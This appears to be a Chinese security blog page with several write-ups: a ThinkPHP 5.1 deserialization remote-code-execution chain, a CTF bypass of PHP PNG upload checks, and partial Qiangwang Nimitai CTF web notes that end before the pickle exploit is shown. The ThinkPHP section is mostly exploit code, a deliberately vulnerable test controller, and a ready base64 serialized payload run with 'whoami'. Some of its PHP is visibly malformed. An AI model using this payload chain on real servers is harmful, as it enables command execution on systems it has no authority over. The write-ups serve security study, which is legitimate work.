<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">public function input($data = [], $name = &#x27;&#x27;, $default = null, $filter = &#x27;&#x27;)</span><br><span class="line"> &#123;</span><br><span class="line">     if (false === $name) &#123;</span><br><span class="line">         // 获取原始数据</span><br><span class="line">         return $data;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     $name = (string) $name;</span><br><span class="line">     if (&#x27;&#x27; != $name) &#123;</span><br><span class="line">         // 解析name</span><br><span class="line">         if (strpos($name, &#x27;/&#x27;)) &#123;</span><br><span class="line">             list($name, $type) = explode(&#x27;/&#x27;, $name);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         $data = $this-&gt;getData($data, $name);</span><br><span class="line"></span><br><span class="line">         if (is_null($data)) &#123;</span><br><span class="line">             return $default;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         if (is_object($data)) &#123;</span><br><span class="line">             return $data;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     // 解析过滤器</span><br><span class="line">     $filter = $this-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">     if (is_array($data)) &#123;</span><br><span class="line">         array_walk_recursive($data, [$this, &#x27;filterValue&#x27;], $filter);</span><br><span class="line">         if (version_compare(PHP_VERSION, &#x27;7.1.0&#x27;, &#x27;&lt;&#x27;)) &#123;</span><br><span class="line">             // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span><br><span class="line">             $this-&gt;arrayReset($data);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125; else &#123;</span><br><span class="line">         $this-&gt;filterValue($data, $name, $filter);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     if (isset($type) &amp;&amp; $data !== $default) &#123;</span><br><span class="line">         // 强制类型转换</span><br><span class="line">         $this-&gt;typeCast($data, $type);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     return $data;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后我们可以控制$filter和$data，然后通过array_walk_recursive()函数来执行命令</p>
<h2 id="exp的构造"><a href="#exp的构造" class="headerlink" title="exp的构造"></a>exp的构造</h2><p>由于Windows类中的file_exists()触发的__toString()魔术方法是在Conversion类中的，又因为这个类是trait，所以不可以实例化，所以要找继承这个类的类，所以我们找到了model类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">abstract class Model implements \JsonSerializable, \ArrayAccess</span><br><span class="line">&#123;</span><br><span class="line">    use model\concern\Attribute;</span><br><span class="line">    use model\concern\RelationShip;</span><br><span class="line">    use model\concern\ModelEvent;</span><br><span class="line">    use model\concern\TimeStamp;</span><br><span class="line">    use model\concern\Conversion;</span><br></pre></td></tr></table></figure>
<p>但是发现Model类是个抽象类，所以我们需要找一个类是继承Model类的，找到了Pivot类，所以第一步，我们需要通过构造Windows类中的$this-file来触发__toString()，根据继承关系，我们可以使用Pivot类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace think\process\pipes;</span><br><span class="line"></span><br><span class="line">use think\model\Pivot;</span><br><span class="line"></span><br><span class="line">class Windows</span><br><span class="line">&#123;</span><br><span class="line">	private $file=[];</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">		$this-&gt;file=[new Pivot()];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时会触发think\model\concern\Conversion类中的__toString()，然后再看向toJson()，再看向toArray()，我们需要控制$this-&gt;append和$this-&gt;data，所以exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">abstract class Model</span><br><span class="line">&#123;</span><br><span class="line">	protected $append;</span><br><span class="line">	private $data;</span><br><span class="line">	public function __construct&#123;</span><br><span class="line">		$this-&gt;append=[&quot;huhu&quot;=&gt;[]];</span><br><span class="line">		$this-&gt;data=[&quot;huhu&quot;=&gt;new Request()];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line"></span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line">class Pivot extends Model</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后触发Request类的__call()魔术方法，所以我们可以构造exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace think;</span><br><span class="line"></span><br><span class="line">class Request</span><br><span class="line">&#123;</span><br><span class="line">	protected $hook;</span><br><span class="line">	protected $config=[];</span><br><span class="line">	protected filter;</span><br><span class="line"></span><br><span class="line">	public function __constuct&#123;</span><br><span class="line">		$this-&gt;hook=[&quot;visible&quot;=&gt;[$this,isAjax]];</span><br><span class="line">		$this-&gt;config[&quot;var_ajax&quot;=&gt;&#x27;huhu&#x27;];</span><br><span class="line">		$this-&gt;filter=&quot;system&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>然后将三部分合在一起，构成最终的exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think;</span><br><span class="line"></span><br><span class="line">class Request</span><br><span class="line">&#123;</span><br><span class="line">	protected $hook;</span><br><span class="line">	protected $config=[];</span><br><span class="line">	protected filter;</span><br><span class="line"></span><br><span class="line">	public function __constuct&#123;</span><br><span class="line">		$this-&gt;hook=[&quot;visible&quot;=&gt;[$this,isAjax]];</span><br><span class="line">		$this-&gt;config[&quot;var_ajax&quot;=&gt;&#x27;huhu&#x27;];</span><br><span class="line">		$this-&gt;filter=&quot;system&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">abstract class Model</span><br><span class="line">&#123;</span><br><span class="line">	protected $append;</span><br><span class="line">	private $data;</span><br><span class="line">	public function __construct&#123;</span><br><span class="line">		$this-&gt;append=[&quot;huhu&quot;=&gt;[]];</span><br><span class="line">		$this-&gt;data=[&quot;huhu&quot;=&gt;new Request()];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line"></span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line">class Pivot extends Model</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\process\pipes;</span><br><span class="line"></span><br><span class="line">use think\model\Pivot;</span><br><span class="line"></span><br><span class="line">class Windows</span><br><span class="line">&#123;</span><br><span class="line">	private $file=[];</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">		$this-&gt;file=[new Pivot()];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize(new Windows()));</span><br></pre></td></tr></table></figure>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>我们只需修改application\index\controller\Index.php文件即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        $b=$_POST[&#x27;code&#x27;];</span><br><span class="line">        $a=unserialize(base64_decode($b));</span><br><span class="line">        return &#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12载初心不改（2006-2018） - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;.$b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function hello($name = &#x27;ThinkPHP5&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        return &#x27;hello,&#x27; . $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后访问/public/index.php，构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">get提交</span><br><span class="line">?huhu[]=whoami</span><br><span class="line"></span><br><span class="line">post提交</span><br><span class="line">code=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo0OiJodWhhIjthOjA6e319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo0OiJodWhhIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjc7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTp7czo4OiJ2YXJfYWpheCI7czo0OiJodWhhIjt9fX19fX0=</span><br></pre></td></tr></table></figure>
<p>即可执行命令</p>
<p>参考文章：[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/12642225.html]">https://www.cnblogs.com/zpchcbd/p/12642225.html]</a><br>    [<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41891666/article/details/107463740]">https://blog.csdn.net/qq_41891666/article/details/107463740]</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%A1%86%E6%9E%B6/" rel="tag">框架</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-finfo_open函数和finfo_file函数绕过以及getimagesize函数绕过" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/10/27/finfo_open%E5%87%BD%E6%95%B0%E5%92%8Cfinfo_file%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8Agetimagesize%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/" class="article-date">
  	<time datetime="2021-10-26T16:00:00.000Z" itemprop="datePublished">2021-10-27</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/27/finfo_open%E5%87%BD%E6%95%B0%E5%92%8Cfinfo_file%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8Agetimagesize%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/">
        finfo_open函数和finfo_file函数绕过以及getimagesize函数绕过
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="finfo-open函数和finfo-file函数绕过以及getimagesize函数绕过"><a href="#finfo-open函数和finfo-file函数绕过以及getimagesize函数绕过" class="headerlink" title="finfo_open函数和finfo_file函数绕过以及getimagesize函数绕过"></a>finfo_open函数和finfo_file函数绕过以及getimagesize函数绕过</h1><h2 id="finfo-open和finfo-file"><a href="#finfo-open和finfo-file" class="headerlink" title="finfo_open和finfo_file"></a>finfo_open和finfo_file</h2><p>finfo_open()是创建一个fileinfo资源的，而finfo_file()是返回一个文件信息的，而一般它们两个函数结合着用。如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE); //创建资源类型</span><br><span class="line">$type = finfo_file($finfo, $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]); //返回文件的类型</span><br></pre></td></tr></table></figure>

<h2 id="getimagesiza"><a href="#getimagesiza" class="headerlink" title="getimagesiza()"></a>getimagesiza()</h2><p>getimagesiza()函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回false，其中返回数组的信息的含义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">索引 0 给出的是图像宽度的像素值</span><br><span class="line"></span><br><span class="line">索引 1 给出的是图像高度的像素值</span><br><span class="line"></span><br><span class="line">索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM</span><br><span class="line"></span><br><span class="line">索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 &lt;image&gt; 标签</span><br><span class="line"></span><br><span class="line">索引 bits 给出的是图像的每种颜色的位数，二进制格式</span><br><span class="line"></span><br><span class="line">索引 channels 给出的是图像的通道值，RGB 图像默认是 3</span><br><span class="line"></span><br><span class="line">索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如：header(&quot;Content-type: image/jpeg&quot;);</span><br></pre></td></tr></table></figure>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>我们可以得到源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">require_once(&#x27;config.php&#x27;);</span><br><span class="line">require_once(&#x27;lib/util.php&#x27;);</span><br><span class="line">require_once(&#x27;lib/session.php&#x27;);</span><br><span class="line"></span><br><span class="line">$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);</span><br><span class="line"></span><br><span class="line">// check whether file is uploaded</span><br><span class="line">if (!file_exists($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]) || !is_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;])) &#123;</span><br><span class="line">  error(&#x27;No file was uploaded.&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// check file size</span><br><span class="line">if ($_FILES[&#x27;file&#x27;][&#x27;size&#x27;] &gt; 256000) &#123;</span><br><span class="line">  error(&#x27;Uploaded file is too large.&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// check file type</span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">$type = finfo_file($finfo, $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">finfo_close($finfo);</span><br><span class="line">if (!in_array($type, [&#x27;image/png&#x27;])) &#123;</span><br><span class="line">  error(&#x27;Uploaded file is not PNG format.&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// check file width/height</span><br><span class="line">$size = getimagesize($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">if ($size[0] &gt; 256 || $size[1] &gt; 256) &#123;</span><br><span class="line">  error(&#x27;Uploaded image is too large.&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if ($size[2] !== IMAGETYPE_PNG) &#123;</span><br><span class="line">  // I hope this never happens...</span><br><span class="line">  error(&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27; . getenv(&#x27;FLAG1&#x27;) . &#x27;&lt;/code&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ok</span><br><span class="line">$filename = bin2hex(random_bytes(4)) . &#x27;.png&#x27;;</span><br><span class="line">move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], UPLOAD_DIR . &#x27;/&#x27; . $filename);</span><br><span class="line"></span><br><span class="line">$session-&gt;set(&#x27;avatar&#x27;, $filename);</span><br><span class="line">flash(&#x27;info&#x27;, &#x27;Your avatar has been successfully updated!&#x27;);</span><br><span class="line">redirect(&#x27;/&#x27;);</span><br></pre></td></tr></table></figure>

<p>通过审计源码，我们呢需要绕过一个if以及finfo_file()函数和getimagesize()函数，第一个if只要我们传小于256尺寸的图片即可，而对于finfo_file()函数，则是检测上传图片类型为image/png，同时getimagesize()则是在检查长宽时，会获取图像大小及相关信息，成功返回一个数组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 290</span><br><span class="line">    [1] =&gt; 69</span><br><span class="line">    [2] =&gt; 3</span><br><span class="line">    [3] =&gt; width=&quot;290&quot; height=&quot;69&quot;</span><br><span class="line">    [bits] =&gt; 8</span><br><span class="line">    [mime] =&gt; image/png</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>由上面可知索引0和1是文件的长和宽，而索引2为文件类型为png，但是只要我们只留png的文件头部，则会让getimagesize()报错，然后绕过它，带出flag</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-强网拟态部分web" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/10/26/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E9%83%A8%E5%88%86web/" class="article-date">
  	<time datetime="2021-10-25T16:00:00.000Z" itemprop="datePublished">2021-10-26</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/26/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E9%83%A8%E5%88%86web/">
        强网拟态部分web
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="zerocalc"><a href="#zerocalc" class="headerlink" title="zerocalc"></a>zerocalc</h1><p>打开页面，发现是readFile(“./src/index.js”)，发现出现nodejs语言，本来打算审计的，但是发现readFile可以读文件，所以直接构造readFile(“/flag”)就可以看见flag了，提示都是骗人的</p>
<h1 id="ezPickle"><a href="#ezPickle" class="headerlink" title="ezPickle"></a>ezPickle</h1><p>打开页面，发现只有一个Hello，但是可以下载附件，所以可以看见两个文件的代码</p>
<p>app.py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, session, render_template_string, url_for,redirect</span><br><span class="line">import pickle</span><br><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">import random</span><br><span class="line">import subprocess</span><br><span class="line">from config import notadmin</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">class RestrictedUnpickler(pickle.Unpickler):</span><br><span class="line">    def find_class(self, module, name):</span><br><span class="line">        if module in [&#x27;config&#x27;] and &quot;__&quot; not in name:</span><br><span class="line">            return getattr(sys.modules[module], name)</span><br><span class="line">        raise pickle.UnpicklingError(&quot;&#x27;%s.%s&#x27; not allowed&quot; % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def restricted_loads(s):</span><br><span class="line">    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br><span class="line">    return RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    info = request.args.get(&#x27;name&#x27;, &#x27;&#x27;)</span><br><span class="line">    if info is not &#x27;&#x27;:</span><br><span class="line">        x = base64.b64decode(info)</span><br><span class="line">        User = restricted_loads(x)</span><br><span class="line">    return render_template_string(&#x27;Hello&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, debug=True, port=5000)</span><br></pre></td></tr></table></figure>

<p>config.py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">notadmin=&#123;&quot;admin&quot;:&quot;no&quot;&#125;</span><br><span class="line"></span><br><span class="line">def backdoor(cmd):</span><br><span class="line">    if notadmin[&quot;admin&quot;]==&quot;yes&quot;:</span><br><span class="line">        s=&#x27;&#x27;.join(cmd)</span><br><span class="line">        eval(s)</span><br></pre></td></tr></table></figure>
<p>通过对两个文件的审计，思路是首先get提交一个name参数，然后便对其进行base64的解码，并放入restricted_loads这个函数中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">info = request.args.get(&#x27;name&#x27;, &#x27;&#x27;)</span><br><span class="line">if info is not &#x27;&#x27;:</span><br><span class="line">    x = base64.b64decode(info)</span><br><span class="line">    User = restricted_loads(x)</span><br></pre></td></tr></table></figure>

<p>然后将其转换为字节流，并放入到RestrictedUnpickler函数中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def restricted_loads(s):</span><br><span class="line">    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br><span class="line">    return RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure>
<p>然后只要满足这个if就可以，使用config.py中的eval(s)，执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if module in [&#x27;config&#x27;] and &quot;__&quot; not in name:</span><br><span class="line">    return getattr(sys.modules[module], name)</span><br></pre></td></tr></table></figure>
<p>但是发现如果要绕过if，需要notadmin[“admin”]==”yes”，但是这里固定了notadmin={“admin”:”no”}，所以我们需要通过python反序列化伪造admin为yes，所以exp</p>
